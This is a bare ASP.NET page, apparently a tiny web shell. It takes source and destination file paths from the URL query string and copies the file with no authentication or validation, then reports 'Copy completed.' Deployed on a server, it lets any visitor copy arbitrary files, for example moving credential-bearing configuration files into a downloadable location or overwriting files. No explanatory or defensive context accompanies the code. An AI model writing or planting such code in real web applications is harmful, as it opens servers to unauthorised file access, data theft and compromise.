<%
Dim src As String = Request.QueryString("src")
Dim dst As String = Request.QueryString("dst")
System.IO.File.Copy(src,dst)
response.write("Copy completed.")
%>